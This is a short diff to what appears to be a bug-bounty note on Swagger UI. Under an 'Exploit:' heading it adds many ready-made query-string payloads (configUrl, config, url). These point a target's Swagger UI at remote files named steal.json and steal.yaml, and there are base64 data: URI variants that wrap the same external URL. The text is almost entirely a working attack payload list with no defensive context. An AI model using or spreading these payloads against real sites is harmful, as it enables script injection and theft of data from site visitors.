@@ -11,13 +11,20 @@ AnyEndpoint Doesn't matter
 ```
 Exploit:
 ```bash
-site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
-site.com/swagger?config=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
-site.com/swagger?url=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.yaml
+?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
+?config=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
+?url=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
+?url=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.yaml
+?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.yaml
+?config=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.yaml
+```
+```bash
 ?configUrl=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
 ?url=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
+?config=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
 ?configUrl=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9
 ?url=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9
+?config=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9
 
 ```
 
